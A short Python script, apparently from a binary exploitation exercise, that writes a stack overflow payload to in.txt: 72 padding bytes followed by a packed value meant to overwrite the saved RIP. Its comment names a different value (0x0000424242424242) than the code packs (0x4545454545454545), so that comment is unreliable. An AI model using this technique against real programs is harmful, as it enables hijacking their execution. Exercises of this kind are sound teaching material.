from struct import *

buf = ""
buf += "A"*72                     # offset to RIP
buf += pack("<Q", 0x4545454545454545)   # overwrite RIP with 0x0000424242424242

f = open("in.txt", "w")
f.write(buf)